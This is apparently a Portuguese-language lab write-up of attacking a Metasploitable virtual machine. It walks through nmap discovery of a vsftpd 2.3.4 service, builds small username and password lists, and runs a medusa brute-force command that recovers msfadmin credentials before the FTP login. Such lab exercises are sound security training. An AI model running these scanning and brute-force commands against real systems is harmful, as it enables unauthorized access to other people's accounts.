# 1. Identificando o alvo na rede

O primeiro passo foi realizar a identificação do alvo na rede, para isso eu precisei realizar um scan utilizando a ferramenta nmap por via de comando no terminal do Kali Linux

```shell
┌──(bazukart㉿kali)-[~]
└─$ sudo nmap -sn -PS -PA 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 00:23 -03
Nmap scan report for 192.168.1.1
Host is up (0.031s latency).
MAC Address: 00:EB:D8:63:C1:A8 (Mercusys Technologies)
Nmap scan report for 192.168.1.101
Host is up (0.00034s latency).
MAC Address: 08:00:27:E6:DC:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.1.110
Host is up.
MAC Address: FC:23:CD:4B:FF:4C (Unknown)
Nmap scan report for 192.168.1.119
Host is up (0.00019s latency).
MAC Address: A8:E2:91:86:A5:59 (Unknown)
Nmap scan report for 192.168.1.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 3.71 seconds
```

Aqui é possível identificar que o host `192.168.1.101` é o nosso alvo principal, por estar identificado como um equipamento vinculado ao VirtualBox

# 2. Identificando o serviço FTP

Depois de ter descoberto o host na rede, ainda utilizarei o nmap para descobrir se o serviço `FTP` (Porta 21) está disponível no alvo que desejo atacar

```shell
┌──(bazukart㉿kali)-[~]
└─$ sudo nmap -sV -p 21 192.168.1.101 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 00:35 -03
Nmap scan report for 192.168.1.101
Host is up (0.00050s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 08:00:27:E6:DC:6D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds

```

Aqui é possível visualizar que o serviço `FTP` está aberto (open), oque indica que ele está pronto para receber conexões

# 3. Explorando o cabeçalho FTP

Nesta etapa, eu realizo um teste de conexão fazendo uma tentativa de login no servidor FTP para visualizar oque o serviço pede credenciais para a realização ao realizar o login

```shell
┌──(bazukart㉿kali)-[~]
└─$ ftp 192.168.1.101
Connected to 192.168.1.101.
220 (vsFTPd 2.3.4)
Name (192.168.1.101:bazukart): teste
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

> O serviço `FTP` pede um nome (name) e senha (password)

# 4. Preparando o ataque

 Como o serviço de `FTP` exige os parâmetros de login e senha, é necessário criar-se 2 listas separadas para colocar possíveis combinações a serem testadas pela ferramenta medusa no momento do ataque

Para isso eu separei 2 arquivos `.txt` com algumas credenciais de possíveis nomes e senhas que possuem a tendencia de usuários leigos estarem utilizando em seus sistemas

## 1. `users.txt`

1. user
2. msfadmin
3. admin
4. root
## 2. `senhas.txt`

1. 123456
2. password
3. qwerty
4. msfadmin
5. admin

Os elementos da lista demonstrada foram bem pequenas, mas ainda sim para terem resultados mais sofisticados e com uma maior probabilidade de acerto, encontra-se WordLists na internet, onde muitas vezes, varias credenciais são vazadas por invasores, que acabam pegando essas informações e utilizando em meios de ataques similares

# 5. Iniciando o ataque

Aqui eu já ponho em pratica o uso da ferramenta `medusa` para efetuar o ataque de força bruta no servidor `FTP` do Metasploitable

```shell
┌──(bazukart㉿kali)-[~/Laboratorio]
└─$ medusa -h 192.168.1.101 -U users.txt -P senhas.txt -M ftp -t 6 | grep "SUCCESS"
```

Explicação do codigo:
- `medusa`: Indica que a ferramenta a ser utilizada será a medusa
- `-h`: Serve para identificar qual será o alvo será executado o ataque
- `192.168.1.101`: Ip do alvo
- `-U`: Indica o arquivo de usuarios (Users)
- `users.txt`: Arquivo de usuarios
- `-P`: Indica o arquivo de senhas (Passwords)
- `senhas.txt`: Arquivo de senhas
- `-M`: Menciona qual o tipo de serviço que o ataque será executado
- `ftp`: serviço ftp
- `-t`: Numero de threads simultâneas
- `6`: Numero de threads

Resultado:

```shell
2025-11-28 01:03:06 ACCOUNT FOUND: [ftp] Host: 192.168.1.101 User: msfadmin Password: msfadmin [SUCCESS]
```

- Observação:
Como esse tipo de ataque tende a mostrar muitas informações, eu simplifiquei para mostrar apenas as credenciais que foram validas (`| grep "SUCCESS"`)

# 7. Analisando o ataque

```shell
┌──(bazukart㉿kali)-[~/Laboratorio]
└─$ medusa -h 192.168.1.101 -U users.txt -P senhas.txt -M ftp -t 6 | grep "SUCCESS"
2025-11-28 01:03:06 ACCOUNT FOUND: [ftp] Host: 192.168.1.101 User: msfadmin Password: msfadmin [SUCCESS]
```

Aqui podemos ver que a tentativa com as credenciais:

- `User`: msfadmin
- `Password`: msfadmin

Correspondem a um sucesso em sua execução

# 8. Invadindo o alvo

Agora podemos inserir tais informações descobertas no cabeçalho do `FTP` e seguir adiante para além do ataque realizado

```shell
┌──(bazukart㉿kali)-[~/Laboratorio]
└─$ ftp 192.168.1.101
Connected to 192.168.1.101.
220 (vsFTPd 2.3.4)
Name (192.168.1.101:bazukart): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20558|).
150 Here comes the directory listing.
drwxr-xr-x    7 1000     1000         4096 Nov 26 21:15 vulnerable
226 Directory send OK.
ftp> 
```

É notório que foi possível invadir o serviço `FTP` e mandar um comando `ls` no sistema de arquivos